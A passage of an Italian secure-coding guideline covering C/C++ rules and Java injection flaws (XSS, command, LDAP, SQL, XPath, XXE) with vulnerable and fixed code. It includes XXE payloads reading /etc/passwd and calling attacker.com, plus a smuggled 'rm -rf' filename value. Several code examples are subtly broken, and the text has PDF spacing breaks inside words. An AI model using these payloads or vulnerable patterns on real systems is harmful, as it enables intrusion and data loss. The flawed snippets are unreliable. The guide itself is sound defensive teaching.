• I tipi di dati esterni non devono essere passati "p er valore" (by value); 
• I vettori e le strutture devono sempre essere passa ti per indirizzo o per riferimento; 
• È auspicabile utilizzare la keyword “const” per i p arametri costanti (strutture o vettori) passati in 
ingresso a una funzione. 
7.1.8.13  Valori di ritorno 
I tipi di dati devono essere appropriati per memori zzare i valori di ritorno delle funzioni; 
 
 
Linee guida per lo sviluppo sicuro Pag. 60  a 156  
 
7.1.8.14  Chiamate a funzioni 
• Ogni chiamata a fprintf() deve avere il suo argomen to FILE pointer inizializzato; 
• Ogni chiamata a funzione deve contenere i parametri  corretti, coerenti con il tipo e il formato del 
prototipo della funzione.  
7.1.8.15  Files 
• Ogni nome di file temporaneo deve essere unico e no n predicibile; 
• Ogni file deve essere chiuso prima di essere riutil izzato (Esempio: fclose()). 
7.1.8.16  Gestione degli errori 
• I valori di ritorno di tutte le chiamate di sistema  devono essere controllati per determinare lo stato  
di esecuzione del programma. Funzioni come perror() , ferror() ed strerror() e la costante errno 
devono essere utilizzate per determinare o riportar e all’utente il tipo di errore occorso; 
• errno non deve essere dichiarato manualmente come u n extern se risiede in uno degli include 
dell’implementazione C/C++ utilizzata; 
• Al verificarsi di un errore critico o imprevisto, a  seguito di una chiamata di sistema, tutti i puntat ori 
e le aree di memoria utilizzate devono essere deref erenziati/disallocate prima della chiusura del 
programma. 
7.1.8.17  Sicurezza dell’applicazione 
• I risultati dei controlli, delle procedure di sicur ezza e i relativi dati non devono risiedere in memo ria 
per lunghi periodi. Ad esempio, le chiavi crittogra fiche devono permanere in memoria solo per il 
tempo necessario al loro utilizzo e devono essere s ovrascritte con dati casuali o “garbage data” al 
termine del loro impiego; 
• I dati critici non devono mai essere serializzati. 
7.2  Java 
Java è un linguaggio di programmazione orientato ag li oggetti, derivato dal C++ e progettato a partire  dal 
1991 da James Gosling assieme ad un gruppo di dipen denti di Sun Microsystems. Il suo duraturo successo  è 
da attribuire al suo orientamento verso il mondo we b, al suo modello object oriented e alla sua peculi arità 
di poter esserere eseguito su qualsiasi sistema ope rativo, mediante l’esecuzione di un bytecode, un 
intermedio di compilazione, su virtual machine.  
Java si è rivelato vincente, oltre che nello svilup po di applicazioni web, anche nella progettazione d i 
applicazioni client-server e nello sviluppo di web services.  
Nel 2010 Oracle Corporation ha rilevato Sun Microsy stems, continuando a sviluppare il linguaggio Java,   
apportamdovi migliorie rilevanti, che lo rendono un  linguaggio potente, flessibile e al passo coi temp i. 
 
Di seguito le principali vulnerabilità e le relativ e contromisure da adottare. 
7.2.1  Cross-site scripting (XSS) 
Come riconoscerla 
Reflected XSS . Si tratta di inoculare e far eseguire script dann osi all’interno di una pagina web. Il mezzo 
attraverso il quale quest’attacco viene perpetrato è la contraffazione dell’input. 
Quando l’input viene racchiuso nella risposta senza  esser filtrato, siamo in presenza di un reflected XSS. 
Stored XSS . In questo caso il codice HTML o lo script incorpo rato attraverso l’input viene memorizzato 
permanentemente sulla pagina e diventa parte integr ante di essa. Dopo un attacco riuscito, tutti gli u tenti 
che accederanno alla pagina saranno potenzialmente vittime dello script installato abusivamente. 
Si pensi, ad esempio, a un blog che consente di ins erire dei commenti o delle recensioni. Se non vi è alcun 
controllo sull’input utente, tag html e script inse riti da un attaccante diverranno parte integrante d ella 
pagina, una volta che il commento sarà pubblicato. 
 
 
Linee guida per lo sviluppo sicuro Pag. 61  a 156  
 
Come difendersi 
Per prima cosa, occorre convalidare tutti gli input , indipendentemente dalla loro provenienza: la 
convalidazione dovrebbe essere basata su una white list (una lista di valori ammessi), per cui verrebb ero 
accettati solo i dati che corrispondono, e verrebbe ro rifiutati tutti gli altri. 
Occorre controllare, oltre che i valori siano fra q uelli ammessi o che rientrino in un determinato int ervallo 
di validità, se corrispondano alle attese anche il tipo, la dimensione e il formato dei dati in input.  
Un altro accorgimento consiste nel codificare compl etamente tutti i dati dinamici (encoding) in modo d a 
neutralizzare eventuali inserimenti malevoli. La li breria ESAPI fornisce funzioni di encryption per un a grande 
varietò di tipologie di input atteso La codifica do vrebbe essere sensibile al contesto, in base al tip o di dato 
che si vuole neutralizzare: se ci si aspetta che po ssa esserci codice HTML abusivo, occorre codificare  gli 
eventuali tag HTML, se ci si potrebbe trovare di fr onte a uno script, allora bisogna codificare gli el ementi 
sintattici di Javascript, ecc. 
Definire in modo esplicito la codifica dei caratter i (charset) per l'intera pagina nell'intestazione d i risposta 
HTTP Content-Type. 
Impostare il flag HttpOnly a true, per evitare tent ativi di furto tramite la lettura tramite script de i cookie di 
sessione. 
Esempio:  
Nel codice che segue, un valore preso dalla request  viene scritta direttametne sulla response: 
String nomeUtente = request.getParameter("nome"); 
response.getWriter().write("Nome Utente: " + nomeUt ente); 
Il rimedio consiste nel filtrare il valore in input : 
response.getWriter().write(ESAPI.encoder().encodeFo rHTML 
( request.getParameter( "nome" ) ); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,   
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.2.2  Code injection 
Come riconoscerla 
Accade quando l’applicazione utilizza, concatenando le, stringhe in input non bonificate. L’attaccante 
potrebbe introdurvi script che potrebbero essere es eguiti direttamente nell’application server. Ciò 
potrebbe portare ad azioni indesiderate. È simile a l Cross Site Scripting, ma qui il codice introdotto  non 
viene integrato nella pagina HTML, ma viene eseguit o a sé. 
Come difendersi 
Evitare di eseguire del codice dinamicamente, speci almente se costruito a partire da input proveniente  
dall’esterno. 
Occorre verificare sempre l’input, fissando control li rigidi che impediscano di immettere caratteri e tipi di 
dati potenzialmente dannosi. L’optimum è designare una white list di valori ammessi e scartare tutto c iò 
che non vi rientra. 
 
Esempio : 
Il seguente codice permette di eseguire un file pun tato dinamicamente in base al valore dell’input 
proveniente dall’esterno, senza controlli. 
 
public class CodeInjection { 
 static void main(String[] args){ 
  System.load(args[0]); 
 } 
} 
 
Nel codice seguente, l’input viene controllato cont ro una white list di valori ammessi: 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 62  a 156  
 
public class CodeInjectionFixed { 
 static void main(String[] args){ 
  String fileName = null; 
  switch(args[0]){ 
  case "First": 
   fileName="First.txt"; 
   break; 
  case "Second": 
   fileName="Second.txt"; 
   break; 
  case "Third": 
   fileName="Third.txt"; 
   break; 
  default : 
   fileName="none.txt"; 
  } 
  System.load(fileName); 
 } 
} 
 
Si veda: http://cwe.mitre.org/data/definitions/94.html,  
CWE-94: Improper Control of Generation of Code ('Co de Injection'). 
7.2.3  Command injection 
Come riconoscerla 
Accade quando l’applicazione esegue comandi di sist ema operativo sul server che la ospita. Un attaccan te 
potrebbe utilizzare questa caratteristica per esegu ire comandi dannosi. 
Si realizza nel momento in cui un’applicazione prev ede un’istruzione che lancia comandi sul sistema 
operativo utilizzando un input non verificato. Coma ndi arbitrari potrebbero: 
• Alterare i permessi su file e directory del file sy stem, (read / create / modify / delete). 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante. 
• Avviare e fermare servizi di sistema. 
• Consentire all’attaccante il controllo completo del  server da parte dell'attaccante. 
 
Attraverso questa vulnerabilità l'applicazione vien e indotta ad eseguire dei comandi voluti dall'utent e 
malintenzionato. L'operazione spesso viene effettua ta concatenando stringhe di input dell'utente a cod ice 
dannoso. Potrebbero così essere eseguiti direttamen te sul server comandi anche molto pericolosi per il  
sistema o per la sicurezza dei dati. 
Come difendersi 
• Scrivere il codice in modo che non esegua nessuna s hell dei comandi. Utilizzare a questo scopo le 
API messe a disposizione delle librerie Java; 
• Se dovessero permanere shell dirette, fare in modo che siano stringhe statiche che non utilizzino 
l’input dell’utente; 
• In ogni caso occorre validare l’input, filtrando i caratteri pericolosi, attraverso una struttura defi nita 
per l’input, o – meglio ancora – imponendo una whit e list di valori ammessi. 
 
Esempio: 
Caso in cui si potrebbe avere command injection: 
public class CommandInjection { 
 public static void main(String[] args) throws IOEx ception { 
  Runtime runtime = Runtime.getRuntime(); 
  Process proc = runtime.exec( "fileNumber"  + args[ 0] + ".exe" ); 
 } 
} 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 63  a 156  
 
Nel codice seguente, invece, l’injection non sarebb e possibile, poiché l’input è un numero e non una 
stringa:  
public class CommandInjectionFixed { 
 public static void main(String[] args) throws IOEx ception { 
  int num = Integer.parseInt(args[0]); 
  // Controlli sul numero immesso 
  Runtime runtime = Runtime.getRuntime(); 
  Process proc = runtime.exec( "fileNumber"  + Integer.toString(num)  + ".exe" ); 
 } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/77.html,   
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.2.4  Connection string injection 
Come riconoscerla 
La stringa di connessione è un insieme di coppie ch iave/valore separate da un punto e virgola. Consent ono 
alle applicazioni Web di connettersi al database o ad altro server (per esempio Active Directory). Se 
un'applicazione Web crea una stringa di connessione  utilizzando la concatenazione di stringhe dinamich e, 
per connettersi al database in base all'input forni to dagli utenti, tale applicazione Web è vulnerabil e 
all'attacco di iniezione della stringa di connessio ne. 
Come in tutti i casi di injection, anche qui parame tri di input non verificati possono essere utilizza ti per  
Come difendersi 
La validazione dell’input, avvalendosi di una white  list, filtrando i caratteri pericolosi, è sempre l a soluzione 
corretta per questo tipo di vulnerabilità. In quest o caso i parametri non dovrebbero includere segni s peciali 
come il punto e virgola, separatore delle varie cop pie chiave/valore. 
 
Esempio :  
Il seguente codice: 
public class ConnectionStringInjection { 
 public static void main(String[] args) throws SQLE xception { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter url name: "); 
  String connURL = userInputScanner.nextLine(); 
  Connection con = DriverManager.getConnection(conn URL, "username" , 
"password" ); 
 } 
} 
Andrebbe corretto come segue: 
public class ConnectionStringInjectionFixed { 
 public static void main(String[] args) throws SQLE xception { 
 HashMap<String, String> sanitize = new HashMap<Str ing, String>(); 
  sanitize.put("DB_url_1", "DB_url_1"); 
  sanitize.put("DB_url_2", "DB_url_2"); 
  sanitize.put("DB_url_3", "DB_url_3"); 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter url name: "); 
  String connURL = userInputScanner.nextLine(); 
  Connection con = DriverManager.getConnection(sani tize.get(connURL), 
"username", "password"); 
 } 
} 
 
Il valore è valido se è uno di quelli memorizzati n ell’hashmap sanitize . 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
 
 
Linee guida per lo sviluppo sicuro Pag. 64  a 156  
 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.2.5  LDAP Injection 
Come riconoscerla 
LDAP è una base dati che censisce in forma di direc tory le utenze del sistema. Se l’input dell’utente viene 
utilizzato, senza subire alcun controllo o filtro, per comporre una query LDAP, è facilmente intuibile  come 
possa trasformarsi in un mezzo per sferrare un atta cco di LDAP injection. 
Il danno che può derivarne dipende da quanto la dir ectory delle utenze venga inquinata.  
Con un attacco di LDAP injection è possibile legger e dati riservati, come è possibile modificarli, can cellarli o 
inserire utenze che poi possono essere utilizzate p er successivi attacchi. 
Se nomeUtente è “Mario Rossi”, la query restituirà i dati relativi all’utente in questione, ma se vien e fornito 
il carattere “*”, verrà restituito l’intera directo ry di utenze.  
Come difendersi 
Come in altri tipi di injection è fondamentale il c ontrollo e l’encoding dell’input, se deve servire p er 
costruire filtri e query verso server LDAP. 
L’encoding deve filtrare i seguenti caratteri: \ # + < > , ; " =  
Altri caratteri scpeciali sono utilizzati all’inter no delle query LDAP e quindi non possono essere eli minati in 
automatico:  * ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! ' 
Il controllo applicativo, dipendente dal contesto, assume un’importanza fondamentale. 
Anche ridurre al minimo i privilegi assegnati all’u tenza con la quale il server LDAP è avviato è una m isura 
utile a minimizzare le conseguenze di un attacco. 
 
Esempio: 
Il seguente codice riceve un userid e password in i nput per comporre una query LDAP. 
 
private void searchRecord(String userSN, String use rPassword) throws 
NamingException { 
  Hashtable < String, String > env = new Hashtable < String, String > (); 
  env.put(Context.INITIAL_CONTEXT_FACTORY, 
"com.sun.jndi.ldap.LdapCtxFactory"); 
  try { 
    DirContext dctx = new InitialDirContext(env); 
    SearchControls sc = new SearchControls(); 
    String[] attributeFilter = { 
      "cn", 
      "mail" 
    }; 
    sc.setReturningAttributes(attributeFilter); 
    sc.setSearchScope(SearchControls.SUBTREE_SCOPE) ; 
    String base = "dc=example,dc=com"; 
    // The following resolves to (&(sn=S*)(userPass word=*)) 
    String filter = "(&(sn=" + userSN + ")(userPass word=" + userPassword + 
"))"; 
    NamingEnumeration << ? > results = dctx.search( base, filter, sc); 
    while (results.hasMore()) { 
      SearchResult sr = (SearchResult) results.next (); 
      Attributes attrs = (Attributes) sr.getAttribu tes(); 
      Attribute attr = (Attribute) attrs.get("cn");  
      System.out.println(attr); 
      attr = (Attribute) attrs.get("mail"); 
      System.out.println(attr); 
    } 
    dctx.close(); 
  } catch (NamingException e) { 
 
 
Linee guida per lo sviluppo sicuro Pag. 65  a 156  
 
    // Forward to handler 
  } 
}  
 
Nel seguente snippet viene effettuato un controllo che impedisce l’injection: 
// ... beginning of LDAPInjection.searchRecord()...  
sc.setSearchScope(SearchControls.SUBTREE_SCOPE); 
String base = "dc=example,dc=com"; 
if (!userSN.matches("[\\w\\s]*") || !userPassword.m atches("[\\w]*")) { 
throw new IllegalArgumentException("Invalid input") ; 
} 
String filter = "(&(sn = " + userSN + ")(userPasswo rd=" + userPassword + "))"; 
// ... remainder of LDAPInjection.searchRecord()...  
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/90.html,   
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
7.2.6  Resource Injection 
Come riconoscerla 
Si verifica quando l’applicazione ha la necessità d i far aprire un socket da parte dell’utente. Un 
malintenzionato potrebbe aprire una backdoor che pe rmette di connettersi direttamente al server, facen do 
escalation dei privilegi fino a prendere il control lo della macchina. Tramite questa vulnerabilità il 
malintenzionato potrebbe utilizzare eventuali conne ssioni aperte dall'utente, nel caso non fossero ges tite 
adeguatamente. 
Come difendersi 
Non si deve in alcun caso consentire a un utente di  definire i parametri relativi ai sockets di rete. 
Validare l’input raffrontandolo con una white list di valori possibili ammessi. 
 
Esempio: 
La situazione iniziale: 
 
public class ResourceInjection { 
 public static void main(String[] args) { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter port number: "); 
  int portNumber  = Integer.parseInt(userInputScanner.nextLine()); 
  try { 
   ServerSocket serverSocket = new ServerSocket(por tNumber); 
  } catch (Exception e) { 
   System.err.println("Caught Exception: " + e.getM essage()); 
  } 
 } 
} 
 
Questa vulnerabilità viene risolta limitando le pos sibilità a poche scelte (white list): 
 
public class ResourceInjectionFixed { 
 public static void main(String[] args) { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter port name: "); 
  String portName = userInputScanner.nextLine(); 
  int portNum; 
  switch (portName) { 
  case "ftps": 
   portNum = 989; 
   break; 
  case "ftp": 
   portNum = 20; 
 
 
Linee guida per lo sviluppo sicuro Pag. 66  a 156  
 
   break; 
  case "smtp": 
   portNum = 25; 
   break; 
  default: 
   portNum = 80; 
  } 
  try { 
   ServerSocket serverSocket = new ServerSocket(por tNum); 
  } catch (Exception e) { 
   System.err.println("Caught Exception: " + e.getM essage()); 
  } 
 } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,   
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.2.7  SQL injection 
Come riconoscerla  
Si verifica quando l’input non verificato viene uti lizzato per comporre dinamicamente uno statement SQ L 
che poi verrà eseguito sulla base dati. Adeguatamen te manipolati, i parametri di input possono modific are 
le query in maniera sostanziale, causando danni di impatto notevole, come l’inserimento di dati malevo li, la 
cancellazione e la modifica di record e la rivelazi one indebita di informazioni riservate. Se i dati u tilizzati per 
la SQL injection sono memorizzati nel database o ne l file system in generale, si parla di SQL injectio n di 
second’ordine (second order SQL injection). 
Come difendersi  
• Come prima misura, occorre validare l’input, sottop onendolo a rigidi controlli, come già illustrato 
nei punti precedenti; 
• Le query SQL non devono mai essere realizzate conca tenando stringhe con l’input esterno. Si 
devono invece utilizzare componenti di database sic uri come le stored procedure, le query 
parametrizzate e le associazioni degli oggetti (per  comandi e parametri; 
• Una soluzione che può essere d’aiuto consiste nell’ utilizzazione di una libreria ORM, come 
EntityFramework, Hibernate o iBatis; 
• Occorre limitare l'accesso agli oggetti e alle funz ionalità del database, in base al "Principle of Lea st 
Privilege" (non fornire agli utenti permessi superi ori a quelli strettamente necessari. 
 
Esempio : 
Codice vulnerabile 
String q='SELECT r FROM User r where r.userId=''+us er+'''; 
Query query=em.createQuery(q); 
List users=query.getResultList();  
 
Codice sicuro 
Query query=em.createNamedQuery('User.findByUserId' ); 
query.setParameter('userId', user); 
List users=query.getResultList(); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,   
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.2.8  XPath injection 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 67  a 156  
 
Si ha quando l’applicazione interroga un documento xml usando una query XPath testuale, creata 
concatenando dinamicamente le istruzioni con string he provenienti dall’esterno. L’attaccante potrebbe 
immettere una stringa che modifica la query XPath, ottenendo dal documento xml informazioni non 
dovute. Se l'input è stato manipolato ad arte, dura nte l'esecuzione dell'applicazione parti del docume nto 
xml, che non dovevano essere raggiunte, vengono ind ebitamente estratte e lette. 
La gravità dell’attacco dipende dal tipo di dati ch e è possibile estrarre dal documento xml. Se contie ne dati 
personali riservati, il furto di informazioni può r ealizzare un data breach; nel caso di dati account,  l’attacco 
può prefigurare ulteriori attacchi di spoofing ed e levation of privileges. 
Come difendersi 
Come prima cosa, occorre procedere con la validazio ne dell’input, come in tutti i casi di injection, 
adottando le precauzioni illustrate nei punti prece denti, tra le quali la depurazione della stringa da  tutti i 
caratteri potenzialmente dannosi. La’adozione di un a white list di valori ammessi è sempre un’ottima 
soluzione. 
 
Evitare che la costruzione della query XPath sia di pendente dalle informazioni inserite dall'utente. S i deve 
mappare la query di tipo XPath con i parametri uten te mantenendo la separazione tra dati e codice. Nel  
caso fosse necessario includere l'input dell’utente  nella query, l'input stesso dovrà essere prima val idato 
correttamente. 
 
Esempio: 
public class XPath_Injection { 
 public static void main(String[] args) { 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter XPath expression: "); 
  String expression = userInputScanner.nextLine(); 
 
  // read a string value 
  XPath XPath = XPathFactory.newInstance().newXPath (); 
  try { 
   XPathExpression email = XPath.compile(expression ); 
  } catch (XPathExpressionException e) { 
   e.printStackTrace(); 
  } 
 } 
} 
 
L’input dell’utente deve essere ricondotto a valori  ammessi (white list): 
public class XPath_Injection_Fixed { 
 public static void main(String[] args) { 
  HashMap<String, String> sanitize = new HashMap<St ring, String>(); 
  sanitize.put("student", "/class/student"); 
  sanitize.put("graduate", "/class/graduate"); 
  sanitize.put("professor", "/class/professor"); 
  Scanner userInputScanner = new Scanner(System.in) ; 
  System.out.print("\nEnter XPath expression: "); 
  String expression = userInputScanner.nextLine(); 
 
  // read a string value 
  XPath XPath = XPathFactory.newInstance().newXPath (); 
  try { 
   XPathExpression email = XPath.compile(sanitize.g et(expression)); 
  } catch (XPathExpressionException e) { 
   e.printStackTrace(); 
  } 
 } 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitr e.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 68  a 156  
 
7.2.9  XML External Entity (XXE) injection 
Come riconoscerla  
Se l’applicazione web riceve in input un documento XML che consente l‘elaborazione di entità esterne, 
dichiarate nel DTD, il sistema potrebbe essere espo sto a possibili attacchi di tipo XXE. Se viene effe ttuato il 
parsing di entità create ad arte, come nell’esempio  seguente, potrebbero essere visualizzate dall’atta ccante 
le password di sistema oppure eseguito del codice m alevolo. 
Esempio: 
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&x xe;</foo> 
<!ENTITY xxe SYSTEM "http://www.attacker.com/text.t xt" >]><foo>&xxe;</foo> 
Come difendersi 
• Bisogna evitare di incorporare entità esterne. 
• Occorre assicurarsi di disabilitare il parser dal c aricamento automatico di entità esterne. 
• Formati di dati meno complessi, come JSON, possono rendere più difficile la serializzazione di dati 
sensibili. 
• Devono essere apportati i necessari aggiornamenti a  tutti i parser e alle librerie XML in uso da parte  
dell'applicazione o sul sistema operativo sottostan te.  
• Se viene utilizzato SOAP, occorre aggiornarlo alla versione 1.2 o successive. 
• Implementare la convalida dell’input come evidenzia to in altri punti. 
• Verificare che la funzionalità di caricamento di fi le XML o XSL convalidI l'XML in entrata utilizzando  
uno schema XSD. 
 
Esempio : 
Formato non corretto 
/* Carica il documento XML e ne mostra il contenuto  */ 
String maliciousSample = "xxe.xml"; 
XMLInputFactory factory = XMLInputFactory.newInstan ce(); 
 
try (FileInputStream fis = new FileInputStream(mali cousSample)) { 
  // Load XML stream 
  XMLStreamReader xmlStreamReader = factory.createX MLStreamReader(fis);  // Non 
sicuro; xmlStreamReader risulta vulnerabile 
 
Formato corretto 
/* Carica il documento XML e ne mostra il contenuto  */ 
String maliciousSample = "xxe.xml"; 
XMLInputFactory factory = XMLInputFactory.newInstan ce(); 
 
// disabilita la risoluzione di entità esterne 
factory.setProperty(XMLInputFactory.IS_SUPPORTING_E XTERNAL_ENTITIES, 
Boolean.FALSE); 
 
// oppure disabilita completamente i DTDs 
factory.setProperty(XMLInputFactory.SUPPORT_DTD, Bo olean.FALSE); 
 
try (FileInputStream fis = new FileInputStream(mali cousSample)) { 
    // Carica il document XML 
    XMLStreamReader xmlStreamReader = factory.creat eXMLStreamReader(fis); 
 
7.2.10  Ulteriori indicazioni per lo sviluppo sicuro 
La seguente raccolta di Best Practices è riconosciu ta ufficialmente da Oracle Java.  
 
 
Linee guida per lo sviluppo sicuro Pag. 69  a 156  
 
7.2.10.1  Inizializzazione 
Variabili e oggetti, prima di essere utilizzati, de vono essere correttamente inizializzati. Per evitar e 
l’allocazione di oggetti non inizializzati: 
• rendere tutte le variabili private e, se necessario , fornire l’accesso ad esse dall’esterno 
esclusivamente attraverso i metodi get() e set(); 
• aggiungere in ogni oggetto una variabile booleana p rivata (es: isInizialized) e fare in modo che ogni 
costruttore, come ultima operazione, la inizializzi  a “true“;  
• in ogni metodo che non sia un costruttore, verifica re che la variabile di inizializzazione della class e 
sia impostata a true prima di eseguire qualsiasi op erazione. 
 
Esempio: 
public class MyClass { 
 private boolean isInizialized; 
 private String nome; 
 public MyClass(String nome){ 
 this.nome = nome; 
 this.isInizialized = true; 
 } 
 public String getNome(){ 
 return (isInizialized == true ? this.nome : null);  
 } 
} 
 
Se la classe ha costruttori statici è necessario se guire la stessa procedura ma a livello di classe: 
• rendere tutte le variabili statiche private e, se n ecessario fornirne l’accesso dall’esterno della cla sse 
stessa: questo deve sempre essere consentito esclus ivamente attraverso i metodi get() e set(); 
• aggiungere alla classe una variabile booleana priva ta statica (es: isClassInizialized) e fare in modo 
che ogni costruttore statico, come ultima operazion e, la inizializzi a “true“; 
• prima di eseguire qualsiasi operazione, in ogni met odo statico ed ogni costruttore si deve verificare 
che la variabile “isClassInitialized” sia impostata  a “true“; 
• Gestione delle allocazioni / deallocazioni di memor ia dinamica; 
 
Prima di uscire da una classe occorre ricordarsi se mpre di azzerare il contenuto delle variabili. Si s upponga, 
nel seguente esempio, che la variabile k contenesse  la chiave per decriptare un messaggio cifrato: 
 
Esempio : 
Forma non corretta 
public class Decodificatore { 
private byte[] k; 
} 
Forma corretta 
public class Erase { 
private byte[] k; 
public void clear() { 
for(int i = 0; i < k.length; i++) 
k [i] = (byte) 0x00; 
} 
} 
Limitare l’accesso alle classi, ai metodi e alle va riabili. 
Ogni classe, metodo e variabile dovrebbero essere d efiniti come private o protected. Potrebbero essere  
dichiarati”public” in casi del tutto eccezionali, m otivati e documentati. Ogni variabile privata deve essere 
accessibile dall’esterno unicamente attraverso meto di set() e get() per mantenere l’oggetto al sicuro.   
 
Esempio : 
public class Studente { 
 private int eta; 
 public int getEta(){ 
 
 
Linee guida per lo sviluppo sicuro Pag. 70  a 156  
 
  return this.eta; 
 } 
 public int setEta(int eta){ 
  this.eta = eta; 
 } 
} 
 
Ogni costante deve essere definita con i modificato ri “static final” per garantire che il valore non s ia 
modificato e sia accessibile staticamente.  
 
Esempio : 
static final int key = 1; 
7.2.10.2  Visibilità 
Classi, metodi e variabili devono essere esplicitam ente marcate come private, protette o pubbliche, pe r 
limitare il livello di accesso da parte di altri og getti. Laddove non è necessario esporre delle funzi onalità, 
deve essere impostato un livello di visibilità più ristretto, al fine di evitare l’esposizione di stru tture interne. 
7.2.10.3  Modificatori 
Ove possibile, è necessario rendere le classi, i me todi e le variabili di tipo “final”.  
L'utilizzo di questo modificatore consente di aumen tare l'efficienza del programma in fase di esecuzio ne, in 
quanto non consente il "late binding". 
 
Esempio: 
public final class MyFinalClass { 
[...] 
} 
 
public class MyClass { 
  final int myConst = 123; 
[...] 
} 
 
public class MyClass { 
  [...] 
  public final void stopOverriding() { 
  [...] 
  } 
} 
 
Le variabili di tipo static dovrebbero essere limit ate allo stretto necessario, poiché la loro visibil ità prescinde 
dal ciclo di vita degli oggetti e sono perciò meno controllabili. Le variabili statiche sono globali e  in un 
ambiente multitutente possono essere modificate da più thread, con risultati imprevedibili. 
7.2.10.4  Utilizzo degli oggetti mutevoli 
Un metodo non dovrebbe mai tornare oggetti mutevoli  (ad esempio array, liste, vettori, date, etc..)  e  non 
dovrebbero mai essere memorizzati internamente in m odo diretto (dovrebbero invece essere 
opportunamente clonati). Si tratta di oggetti raggi unti per indirizzo, per cui tornare un array privat o da un 
metodo pubblico, esporrebbe i dati a possibili mani polazioni da parte di un attaccante.  
 
Esempio 1: 
Forma non corretta: 
public Date getDate() { 
return fDate; 
} 
Forma corretta: 
public Date getDate() { 
return new Date(fDate.getTime()); 
 
 
Linee guida per lo sviluppo sicuro Pag. 71  a 156  
 
} 
 
Esempio  2: 
Forma non corretta: 
public void useDate(Date date) { 
if (isValid(date)) 
scheduleTask(date); 
} 
Forma corretta: 
public void useDate(Date date) { 
Date copied_date = new Date(date.getTime()); 
if (isValid(copied_date))  
scheduleTask(copied_date); 
} 
7.2.10.5  Definizione delle classi 
Evitare l’utilizzo di classi interne (inner classes ). In casi del tutto eccezionali, comunque, le clas si interne 
devono sempre essere definite come private.  
 
Esempio: 
Forma non corretta: 
package esempio; 
public class MyFirstClass { 
  [...] 
  private class MySecondClass { 
  } 
  [...] 
} 
Forma corretta: 
package esempio; 
public class MyFirstClass { 
[...] 
} 
class MySecondClass { 
[...] 
} 
Per tener conto dei rilasci, è opportuno inserire u n codice di versione per ogni classe, collocandolo 
all’interno di una variabile pubblica final, ed eff ettuare i controlli per la coerenza di versione sul le classi del 
package. 
7.2.10.6  Codice e permessi speciali 
Le classi Java non dovrebbero effettuare operazioni  di sistema diretti. Non dovrebbero cambiare i perm essi 
sul file system, né aprire socket, né caricare libr erie dinamiche attraverso la System.loadLibrary o l a 
Runtime.getRuntime.loadlibrary, ecc. 
Se una di queste operazioni dovessere rendersi nece ssaria, occorrerà documentarne le motivazioni e 
procedere con lo sviluppo nella massima sicurezza.  
In generale, come già accennato, minori sono i priv ilegi, più è sicura l’applicazione. 
7.2.10.7  Esecuzione dei comandi di sistema 
Supponiamo che un aggressore assegni alla variabile  filename un valore del tipo:  
filename =“joe; /bin/rm –rf /*”; 
Nell’esempio sotto riportato verrà eseguito il codi ce malevolo (forma non corretta); nella forma corre tta, il 
codice malevolo sarà, invece, ignorato. 
 
Esempio: 
Forma non corretta: 
void method (String filename) { 
System.exec("more " + filename);  
 
 
Linee guida per lo sviluppo sicuro Pag. 72  a 156  
 
} 
Forma corretta: 
void method (String filename){ 
if (new File(filename).exists()){  
 // Controlli di white list …. 
System.exec("more " + filename); 
} 
} 
7.2.10.8  Oggetti 
Per ragioni di sicurezza è necessario rendere le cl assi e gli oggetti non clonabili. Di seguito viene riportato 
un esempio su come è possibile rispettare questa re gola: 
[...] 
public final void clone() throws java.lang.CloneNot SupportedException { 
  throw new java.lang.CloneNotSupportedException();  
} 
[...] 
Nei casi eccezionali, che dovrebbero essere motivat i e ampiamente documentati, bisogna etichettare i 
metodi che consentono la clonazione di tipo “final” , in modo da evitare potenziali un loro malevolo 
override. Di seguito viene riportato un esempio su come è possibile gestire queste eccezioni: 
[...] 
public final void clone() throws java.lang.CloneNot SupportedException { 
  super.clone(); 
} 
  [...] 
Comparazione degli oggetti di classe. Non effettuar e mai la comparazione per nome degli oggetti di cla sse. 
Di seguito viene riportato un esempio su come è pos sibile rispettare questa regola: 
 
Esempio: 
Forma non corretta: 
public class MyClass { 
  public boolean sameClass (Object o) { 
    Class thisClass = this.getClass(); 
    Class otherClass = o.getClass(); 
    return (thisClass.getName() == otherClass.getNa me()); 
  } 
} 
Forma corretta: 
package esempio; 
public class MyClass { 
  public boolean sameClass (Object o) { 
    Class thisClass = this.getClass(); 
    Class otherClass = o.getClass(); 
    return (thisClass == otherClass); 
  } 
} 
7.2.10.9  Serializzazione e deserializzazione 
Rendere le classi e gli oggetti non serializzabili.  Di seguito viene riportato un esempio su come è po ssibile 
rispettare questa regola: 
[...] 
private final void writeObject(ObjectOutputStream o ut) throws java.io.IOException 
{ 
   throw new java.io.IOException("L’oggetto non può  essere serializzato "); 
} 
[...] 
Rendere le classi e gli oggetti non deserializzabil i. Di seguito un esempio su come è possibile rispet tare 
questa regola: 
[...] 
